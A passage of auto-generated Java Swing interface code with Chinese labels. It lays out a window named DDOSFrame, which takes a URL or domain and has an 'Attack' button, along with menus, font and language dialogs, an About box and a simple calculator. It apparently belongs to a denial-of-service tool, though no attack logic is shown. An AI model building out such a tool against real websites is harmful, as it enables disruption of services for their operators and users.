        jScrollPane5.setViewportView(urlInput);

        jLabel8.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel8.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel8.setText("請輸入網址或是域名");

        jLabel9.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel9.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel9.setText("This is Console(控制台)");

        CancelButton.setText("取消");
        CancelButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CancelButtonActionPerformed(evt);
            }
        });

        jMenu4.setForeground(new java.awt.Color(51, 255, 51));
        jMenu4.setText("這是檔案");

        Exit.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F1, java.awt.event.InputEvent.SHIFT_MASK));
        Exit.setText("別亂來");
        Exit.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ExitActionPerformed(evt);
            }
        });
        jMenu4.add(Exit);

        Exit1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F2, java.awt.event.InputEvent.SHIFT_MASK));
        Exit1.setText("勸你");
        Exit1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Exit1ActionPerformed(evt);
            }
        });
        jMenu4.add(Exit1);

        Exit2.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F3, java.awt.event.InputEvent.SHIFT_MASK));
        Exit2.setText("這很恐怖");
        Exit2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Exit2ActionPerformed(evt);
            }
        });
        jMenu4.add(Exit2);

        Exit5.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F4, java.awt.event.InputEvent.ALT_MASK));
        Exit5.setText("點我");
        Exit5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Exit5ActionPerformed(evt);
            }
        });
        jMenu4.add(Exit5);

        Exit3.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F4, java.awt.event.InputEvent.SHIFT_MASK));
        Exit3.setText("離開");
        Exit3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Exit3ActionPerformed(evt);
            }
        });
        jMenu4.add(Exit3);

        jMenuBar3.add(jMenu4);

        jMenu5.setForeground(new java.awt.Color(51, 255, 51));
        jMenu5.setText("編輯");

        jMenuItem2.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem2.setText("複製");
        jMenuItem2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem2ActionPerformed(evt);
            }
        });
        jMenu5.add(jMenuItem2);

        jMenuItem3.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_V, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem3.setText("貼上");
        jMenu5.add(jMenuItem3);

        jMenuItem4.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_X, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem4.setText("剪下");
        jMenuItem4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem4ActionPerformed(evt);
            }
        });
        jMenu5.add(jMenuItem4);

        jMenuBar3.add(jMenu5);

        jMenu6.setForeground(new java.awt.Color(51, 255, 51));
        jMenu6.setText("更多");

        jMenuItem1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_E, java.awt.event.InputEvent.ALT_MASK));
        jMenuItem1.setText("關於");
        jMenuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem1ActionPerformed(evt);
            }
        });
        jMenu6.add(jMenuItem1);

        jMenuBar3.add(jMenu6);

        DDOSFrame.setJMenuBar(jMenuBar3);

        javax.swing.GroupLayout DDOSFrameLayout = new javax.swing.GroupLayout(DDOSFrame.getContentPane());
        DDOSFrame.getContentPane().setLayout(DDOSFrameLayout);
        DDOSFrameLayout.setHorizontalGroup(
            DDOSFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane4)
            .addComponent(jLabel9, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, DDOSFrameLayout.createSequentialGroup()
                .addContainerGap(208, Short.MAX_VALUE)
                .addGroup(DDOSFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addGroup(DDOSFrameLayout.createSequentialGroup()
                        .addComponent(AttackButton, javax.swing.GroupLayout.PREFERRED_SIZE, 97, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(CancelButton, javax.swing.GroupLayout.PREFERRED_SIZE, 97, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(DDOSFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane5, javax.swing.GroupLayout.PREFERRED_SIZE, 289, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel8, javax.swing.GroupLayout.PREFERRED_SIZE, 289, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(224, 224, 224))
        );
        DDOSFrameLayout.setVerticalGroup(
            DDOSFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(DDOSFrameLayout.createSequentialGroup()
                .addComponent(jLabel9)
                .addGap(1, 1, 1)
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 361, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(jLabel8)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane5, javax.swing.GroupLayout.PREFERRED_SIZE, 69, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 10, Short.MAX_VALUE)
                .addGroup(DDOSFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(AttackButton, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(CancelButton, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap())
        );

        FileChoose.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                FileChooseActionPerformed(evt);
            }
        });
        FileChoose.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                FileChooseKeyReleased(evt);
            }
        });

        javax.swing.GroupLayout FileChooseFrameLayout = new javax.swing.GroupLayout(FileChooseFrame.getContentPane());
        FileChooseFrame.getContentPane().setLayout(FileChooseFrameLayout);
        FileChooseFrameLayout.setHorizontalGroup(
            FileChooseFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(FileChoose, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );
        FileChooseFrameLayout.setVerticalGroup(
            FileChooseFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(FileChoose, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );

        preference.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                preferenceKeyReleased(evt);
            }
        });

        fontButton.setText("字體");
        fontButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                fontButtonActionPerformed(evt);
            }
        });

        wordButton.setText("字型");
        wordButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                wordButtonActionPerformed(evt);
            }
        });

        bgButton.setText("背景");
        bgButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                bgButtonActionPerformed(evt);
            }
        });

        displayAreaButton.setText("顯示框");
        displayAreaButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                displayAreaButtonActionPerformed(evt);
            }
        });

        urlAreaButton.setText("網址列");
        urlAreaButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                urlAreaButtonActionPerformed(evt);
            }
        });

        presssure1.setText("確定");
        presssure1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                presssure1ActionPerformed(evt);
            }
        });

        disPlayButton.setText("顯示");
        disPlayButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                disPlayButtonActionPerformed(evt);
            }
        });

        languageButton.setText("語言");
        languageButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                languageButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout preferenceLayout = new javax.swing.GroupLayout(preference.getContentPane());
        preference.getContentPane().setLayout(preferenceLayout);
        preferenceLayout.setHorizontalGroup(
            preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(preferenceLayout.createSequentialGroup()
                .addGroup(preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(disPlayButton, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(fontButton, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(wordButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(languageButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(presssure1, javax.swing.GroupLayout.PREFERRED_SIZE, 82, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(preferenceLayout.createSequentialGroup()
                        .addComponent(bgButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(displayAreaButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(urlAreaButton)))
                .addContainerGap(63, Short.MAX_VALUE))
        );
        preferenceLayout.setVerticalGroup(
            preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(preferenceLayout.createSequentialGroup()
                .addGroup(preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(fontButton)
                    .addComponent(wordButton)
                    .addComponent(bgButton)
                    .addComponent(displayAreaButton)
                    .addComponent(urlAreaButton))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(preferenceLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(disPlayButton)
                    .addComponent(languageButton))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 305, Short.MAX_VALUE)
                .addComponent(presssure1, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        FontFrame.setMinimumSize(new java.awt.Dimension(400, 400));

        TitleFontWord.setFont(new java.awt.Font("新細明體", 0, 18)); // NOI18N
        TitleFontWord.setText("視窗標題字體");

        jCheckBox1.setText("標楷體");
        jCheckBox1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jCheckBox1ActionPerformed(evt);
            }
        });

        jCheckBox2.setText("新細明體");

        ChooseFontWord.setFont(new java.awt.Font("新細明體", 0, 18)); // NOI18N
        ChooseFontWord.setText("選項字體");

        jCheckBox3.setText("標楷體");

        jCheckBox4.setText("新細明體");
        jCheckBox4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jCheckBox4ActionPerformed(evt);
            }
        });

        indexFontWord.setFont(new java.awt.Font("新細明體", 0, 18)); // NOI18N
        indexFontWord.setText("內文字體");

        jCheckBox5.setText("標楷體");

        jCheckBox6.setText("新細明體");
        jCheckBox6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jCheckBox6ActionPerformed(evt);
            }
        });

        presssure2.setText("確定");

        javax.swing.GroupLayout FontFrameLayout = new javax.swing.GroupLayout(FontFrame.getContentPane());
        FontFrame.getContentPane().setLayout(FontFrameLayout);
        FontFrameLayout.setHorizontalGroup(
            FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(FontFrameLayout.createSequentialGroup()
                .addGroup(FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(FontFrameLayout.createSequentialGroup()
                        .addGap(123, 123, 123)
                        .addComponent(TitleFontWord))
                    .addGroup(FontFrameLayout.createSequentialGroup()
                        .addGap(140, 140, 140)
                        .addGroup(FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jCheckBox5)
                            .addGroup(FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                .addComponent(jCheckBox2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(jCheckBox1, javax.swing.GroupLayout.Alignment.LEADING)
                                .addComponent(jCheckBox4, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(indexFontWord, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(jCheckBox6, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(presssure2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addGroup(FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jCheckBox3)
                                    .addComponent(ChooseFontWord))))))
                .addContainerGap(169, Short.MAX_VALUE))
        );
        FontFrameLayout.setVerticalGroup(
            FontFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(FontFrameLayout.createSequentialGroup()
                .addGap(14, 14, 14)
                .addComponent(TitleFontWord)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox2)
                .addGap(8, 8, 8)
                .addComponent(ChooseFontWord, javax.swing.GroupLayout.PREFERRED_SIZE, 39, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox3)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox4)
                .addGap(18, 18, 18)
                .addComponent(indexFontWord, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox5)
                .addGap(4, 4, 4)
                .addComponent(jCheckBox6)
                .addGap(44, 44, 44)
                .addComponent(presssure2, javax.swing.GroupLayout.PREFERRED_SIZE, 35, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(33, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout bgFrameLayout = new javax.swing.GroupLayout(bgFrame.getContentPane());
        bgFrame.getContentPane().setLayout(bgFrameLayout);
        bgFrameLayout.setHorizontalGroup(
            bgFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        bgFrameLayout.setVerticalGroup(
            bgFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout displayAreaLayout = new javax.swing.GroupLayout(displayArea.getContentPane());
        displayArea.getContentPane().setLayout(displayAreaLayout);
        displayAreaLayout.setHorizontalGroup(
            displayAreaLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        displayAreaLayout.setVerticalGroup(
            displayAreaLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout urlAreaFrameLayout = new javax.swing.GroupLayout(urlAreaFrame.getContentPane());
        urlAreaFrame.getContentPane().setLayout(urlAreaFrameLayout);
        urlAreaFrameLayout.setHorizontalGroup(
            urlAreaFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        urlAreaFrameLayout.setVerticalGroup(
            urlAreaFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout disPlayLayout = new javax.swing.GroupLayout(disPlay.getContentPane());
        disPlay.getContentPane().setLayout(disPlayLayout);
        disPlayLayout.setHorizontalGroup(
            disPlayLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        disPlayLayout.setVerticalGroup(
            disPlayLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        langFrame.setMinimumSize(new java.awt.Dimension(400, 400));

        TredChinese.setText("繁體中文");
        TredChinese.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                TredChineseActionPerformed(evt);
            }
        });

        SimpChinese.setText("簡體中文");
        SimpChinese.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                SimpChineseActionPerformed(evt);
            }
        });

        English1.setText("英文");
        English1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                English1ActionPerformed(evt);
            }
        });

        Japanese.setText("日文");
        Japanese.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                JapaneseActionPerformed(evt);
            }
        });

        ABClang.setText("外星文");
        ABClang.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ABClangActionPerformed(evt);
            }
        });

        SurePress1.setText("確定");
        SurePress1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                SurePress1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout langFrameLayout = new javax.swing.GroupLayout(langFrame.getContentPane());
        langFrame.getContentPane().setLayout(langFrameLayout);
        langFrameLayout.setHorizontalGroup(
            langFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(langFrameLayout.createSequentialGroup()
                .addComponent(TredChinese)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(SimpChinese)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(English1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Japanese)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(ABClang)
                .addGap(0, 31, Short.MAX_VALUE))
            .addGroup(langFrameLayout.createSequentialGroup()
                .addGap(148, 148, 148)
                .addComponent(SurePress1, javax.swing.GroupLayout.PREFERRED_SIZE, 113, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        langFrameLayout.setVerticalGroup(
            langFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(langFrameLayout.createSequentialGroup()
                .addGroup(langFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(TredChinese)
                    .addComponent(SimpChinese)
                    .addComponent(English1)
                    .addComponent(Japanese)
                    .addComponent(ABClang))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 630, Short.MAX_VALUE)
                .addComponent(SurePress1, javax.swing.GroupLayout.PREFERRED_SIZE, 37, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        javax.swing.GroupLayout wordFrameLayout = new javax.swing.GroupLayout(wordFrame.getContentPane());
        wordFrame.getContentPane().setLayout(wordFrameLayout);
        wordFrameLayout.setHorizontalGroup(
            wordFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        wordFrameLayout.setVerticalGroup(
            wordFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        AboutFrame.setMinimumSize(new java.awt.Dimension(500, 700));

        jTextArea2.setColumns(20);
        jTextArea2.setRows(5);
        jTextArea2.setText("(C) Aishen-Shanling Team Update on 2020/2/29 版權所有 保留一切權利\n版本: 正式版3.0");
        jScrollPane6.setViewportView(jTextArea2);

        presssure3.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        presssure3.setText("確定");
        presssure3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                presssure3ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout AboutFrameLayout = new javax.swing.GroupLayout(AboutFrame.getContentPane());
        AboutFrame.getContentPane().setLayout(AboutFrameLayout);
        AboutFrameLayout.setHorizontalGroup(
            AboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane6, javax.swing.GroupLayout.DEFAULT_SIZE, 500, Short.MAX_VALUE)
            .addComponent(presssure3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        AboutFrameLayout.setVerticalGroup(
            AboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(AboutFrameLayout.createSequentialGroup()
                .addComponent(jScrollPane6, javax.swing.GroupLayout.PREFERRED_SIZE, 649, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(presssure3, javax.swing.GroupLayout.PREFERRED_SIZE, 62, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        plus.setMinimumSize(new java.awt.Dimension(400, 400));

        NumA.setColumns(20);
        NumA.setRows(5);
        NumA.setMaximumSize(new java.awt.Dimension(40, 250));
        jScrollPane7.setViewportView(NumA);

        NumB.setColumns(20);
        NumB.setRows(5);
        NumB.setMaximumSize(new java.awt.Dimension(250, 40));
        jScrollPane8.setViewportView(NumB);

        culc.setText("計算");
        culc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                culcActionPerformed(evt);
            }
        });

        jButton4.setText("+");
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });

        jButton5.setText("-");
        jButton5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton5ActionPerformed(evt);
            }
        });

        jButton6.setText("*");
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });

        jButton7.setText("/");
        jButton7.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton7ActionPerformed(evt);
            }
        });

        plusType.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        plusType.setText("無");

        resultNameFont.setText("結果:");

        ResultA.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        ResultA.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));

        leftB.setText("離開");
        leftB.setMinimumSize(new java.awt.Dimension(0, 0));
        leftB.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                leftBActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout plusLayout = new javax.swing.GroupLayout(plus.getContentPane());
        plus.getContentPane().setLayout(plusLayout);
        plusLayout.setHorizontalGroup(
            plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(plusLayout.createSequentialGroup()
                .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(plusLayout.createSequentialGroup()
                        .addComponent(jScrollPane7, javax.swing.GroupLayout.PREFERRED_SIZE, 146, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(plusLayout.createSequentialGroup()
                                .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(plusType, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                    .addGroup(plusLayout.createSequentialGroup()
                                        .addGap(13, 13, 13)
                                        .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                            .addComponent(jButton4)
                                            .addComponent(jButton5))
                                        .addGap(0, 20, Short.MAX_VALUE)))
                                .addGap(18, 18, 18))
                            .addGroup(plusLayout.createSequentialGroup()
                                .addGap(10, 10, 10)
                                .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jButton6)
                                    .addComponent(jButton7))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                        .addComponent(jScrollPane8, javax.swing.GroupLayout.PREFERRED_SIZE, 136, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(plusLayout.createSequentialGroup()
                        .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(plusLayout.createSequentialGroup()
                                .addGap(133, 133, 133)
                                .addComponent(culc, javax.swing.GroupLayout.PREFERRED_SIZE, 110, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(plusLayout.createSequentialGroup()
                                .addGap(161, 161, 161)
                                .addComponent(leftB, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, plusLayout.createSequentialGroup()
                                .addContainerGap()
                                .addComponent(resultNameFont, javax.swing.GroupLayout.PREFERRED_SIZE, 83, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(ResultA, javax.swing.GroupLayout.PREFERRED_SIZE, 123, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        plusLayout.setVerticalGroup(
            plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(plusLayout.createSequentialGroup()
                .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jScrollPane7)
